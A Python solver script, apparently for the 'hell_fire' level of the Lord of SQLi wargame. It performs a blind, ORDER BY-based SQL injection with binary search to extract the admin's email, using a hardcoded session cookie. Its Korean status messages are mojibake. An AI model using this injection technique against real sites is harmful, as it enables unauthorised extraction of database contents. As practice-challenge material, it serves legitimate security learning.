import requests

def send(param):
    url = "https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php"
    cookie = "sdrjk57hqa404dvtb3akcpfvk1"
    head = {"PHPSESSID":f"{cookie}"}
    my_url = url+param
    res = requests.get(my_url, cookies=head)
    return res.text

print("π LoS 23μ μμν©λλ€")

for num in range(0,100):
    param=f"?order=if(id='admin' and length(email)={num}, 'id', 'score')"
    if("200</td></tr><tr><td>rubiya" in send(param)):
        print(f"π emailμ κΈΈμ΄λ {num}μλλ€!")
        break

ans=""

for len in range(1, num+1):
    start = 32
    end = 127
    while True:
        middle = round((start+end)/2)
        param=f"?order=if(id='admin' and ascii(substr(email,{len},1))>={middle}, 'id', 'score') %23"
        if("200</td></tr><tr><td>rubiya" in send(param)):
            param=f"?order=if(id='admin' and ascii(substr(email,{len},1))={middle}, 'id', 'score') %23"
            if("200</td></tr><tr><td>rubiya" in send(param)):
                print(f"{len}λ²μ§Έ λ¬Έμ β {chr(middle)}")
                ans+=chr(middle)
                break
            else:
                start = middle
                continue
        else:
            end = middle
            continue

print(f"π emailμ μ μ²΄λ [{ans}]μλλ€!")
